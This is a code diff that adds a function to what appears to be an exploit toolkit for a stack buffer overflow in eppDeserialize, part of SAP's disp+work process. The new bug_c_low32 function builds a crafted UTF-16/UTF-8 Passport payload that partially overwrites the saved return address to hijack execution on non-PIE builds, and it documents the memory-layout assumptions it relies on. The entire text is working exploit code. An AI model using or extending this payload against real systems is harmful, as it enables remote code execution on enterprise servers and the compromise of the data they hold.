@@ -227,6 +227,62 @@ def bug_b() -> Passport:
     return p
 
 
+def bug_c_low32(target_rip: int, filler_unit: int = 0x0041) -> Passport:
+    """Bug C partial-overwrite variant for non-PIE dw builds.
+
+    Julian's standard `bug_c` writes 3 UTF-16 units (u0, u1, u2) plus the
+    converter's 0x0000 terminator for a full 4-unit (8-byte) saved-RIP
+    overwrite.  On dw builds compiled without PIE, disp+work sits at the
+    fixed base 0x00400000, so every stage-1 candidate has u2 = 0.  The
+    UTF-8→UCS converter can NOT emit U+0000 in the middle of the source
+    string (it terminates), and `utf8_unit(0)` raises accordingly, so
+    the standard 3-unit hijack path is closed.
+
+    This variant writes ONLY 2 UTF-16 units (u0, u1 = the low 32 bits
+    of target_rip) and relies on the converter's terminator to write
+    U+0000 at unit 542.  Unit 543 (top 16 bits of saved RIP) is NOT
+    touched — its post-transcode value is whatever the frame had
+    pre-overflow.
+
+    **Assumption**: eppDeserialize's saved RIP points into the caller,
+    which for every observed dw build is a function inside disp+work
+    text (0x00400000..0x03fa5000 for non-PIE, ASLR-randomised low
+    canonical space for PIE).  Both ranges have top 16 bits = 0x0000,
+    so unit 543's pre-existing bytes are 0x00 0x00.  After partial
+    overwrite the saved RIP is:
+
+        [u0 LE][u1 LE][0x00 0x00 from terminator][0x00 0x00 preserved]
+        = target_rip when target_rip < 2^32.
+
+    Only valid when `0 < target_rip < 2^32` and neither low unit is
+    zero or in the surrogate range 0xD800-0xDFFF.
+    """
+    if not (0 < target_rip < (1 << 32)):
+        raise ValueError(
+            f"bug_c_low32 target {target_rip:#x} must fit in low 32 bits "
+            f"(0 < addr < 2^32) — use bug_c for full-48-bit targets."
+        )
+    u0 = target_rip & 0xFFFF
+    u1 = (target_rip >> 16) & 0xFFFF
+    for name, u in (("u0", u0), ("u1", u1)):
+        if u == 0:
+            raise ValueError(f"bug_c_low32: {name} of {target_rip:#x} is U+0000 (unencodable)")
+        if 0xD800 <= u <= 0xDFFF:
+            raise ValueError(f"bug_c_low32: {name} of {target_rip:#x} is a surrogate {u:#06x}")
+
+    data = b"".join(utf8_unit(filler_unit) for _ in range(RIP_OFFSET_UNITS))
+    data += utf8_unit(u0)
+    data += utf8_unit(u1)
+    data += b"\x00"   # transcode writes 0x0000 at unit 542, then terminates.
+                        # Unit 543 is not touched — pre-overflow zero preserved.
+
+    p = Passport()
+    p.varpart_begin()
+    p.item(1, 0, 4, data)
+    p.varpart_end()
+    return p
+
+
 def bug_c(target_rip: int, filler_unit: int = 0x0041) -> Passport:
     """Bug C: type-4 item overflowing the eppDeserialize stack frame,
     hijacking the saved return address to `target_rip`.
